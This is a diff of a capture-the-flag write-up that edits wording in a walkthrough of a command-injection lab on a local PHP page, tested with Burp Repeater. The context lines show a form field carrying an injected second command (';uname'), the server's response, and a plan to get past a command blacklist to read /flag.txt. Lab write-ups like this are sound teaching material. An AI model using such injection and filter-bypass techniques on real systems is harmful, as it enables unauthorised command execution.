@@ -76,6 +76,7 @@ There are several ways to make POST requests, with cURL, Powershell and also fro
 If you have set up Burp and your browser correctly, letting the traffic flow through the Burp as a Proxy you catch the GET request for http://localhost:1337/bing.php.
 
 ![Bing2_image2](https://github.com/user-attachments/assets/c40638a6-2c0b-4303-b9c6-f67454ba4cfb)
+
 If you right click on the GET request (or press CTRL-R), you can send this request to Repeater, where we can modify the request to fit our needs.
 
 In the Repeater pane we can see this request code
@@ -163,7 +164,7 @@ Content-Length: 18
 Submit=1&ip=127.0.0.1;uname
 ```
 
-The command uname work, since it is not in the blacklist. And the request will return
+The command `uname` works, since it is not in the blacklist. And the request will return
 ``` http
 HTTP/1.1 200 OK
 Date: Mon, 29 Jul 2024 12:21:23 GMT
@@ -174,9 +175,9 @@ Content-Type: text/html; charset=UTF-8
 Linux
 ```
 
-And we have showed that we can inject commands.
+And we have shown that we can inject commands.
 ## Bypassing the blacklist
-Alright, we now know that the bing.php is vulnerable to command injection we need to find a way to get the flag. We know that it is located at `/flag.txt` and one way to read it would be with the `cat` command. So our first approach is to do this call
+Alright, we now know that the `bing.php` is vulnerable to command injection we need to find a way to get the flag. We know that it is located at `/flag.txt` and one way to read it would be with the `cat` command. So our first approach is to do this call
 ``` bash
 cat /flag.txt
 ```
